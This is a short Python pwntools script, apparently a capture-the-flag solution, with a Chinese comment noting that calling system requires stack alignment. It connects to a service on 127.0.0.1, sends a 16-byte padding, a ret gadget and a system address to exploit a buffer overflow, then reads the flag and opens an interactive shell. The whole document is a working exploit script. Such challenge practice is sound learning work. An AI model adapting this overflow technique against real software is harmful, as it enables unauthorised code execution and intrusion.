# 学到 system 需要栈对齐
from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

# p = process('./pwn')
p = remote('127.0.0.1',61234)

p.recvuntil(b'?\n')
p.sendline(b'32')
# print('pid'+str(proc.pidof(p)))
# pause()
ret = 0x401170
system = 0x4011B6
p.send(b'a'*16+p64(ret)+p64(system))
p.recvuntil(b't!\n')
p.sendline(b'cat flag')
p.interactive()